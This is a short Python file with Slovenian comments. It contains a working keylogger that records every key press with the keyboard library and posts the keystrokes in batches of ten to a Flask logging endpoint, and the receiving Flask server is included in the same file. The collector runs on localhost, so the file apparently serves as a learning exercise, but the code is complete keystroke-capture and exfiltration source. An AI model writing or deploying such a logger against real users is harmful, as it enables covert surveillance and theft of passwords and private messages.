import requests
import keyboard

crke = ["a", "b", "c"]

url = "http://127.0.0.1:5000/log"

def send():
    response = requests.post(url, json = crke)
# Funkcija, ki se sproži ob pritisku tipke
def on_key_press(event):
    global crke
    print(f'Pritisnjena tipka: {event.name}')
    crke.append(event.name)
    print(crke, len(crke))
    if len(crke) >= 10:
        response = requests.post(url, json = crke)
        crke = []

# Registriramo funkcijo, ki "posluša" tipke
keyboard.on_press(on_key_press)

# Program teče dokler ne pritisnemo ESC
keyboard.wait('esc')

send()



#sdf
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"

@app.route("/log", methods=["POST"])
def log():
    data = request.json
    print(data)
    return jsonify({"status": data})

app.run(debug = True)
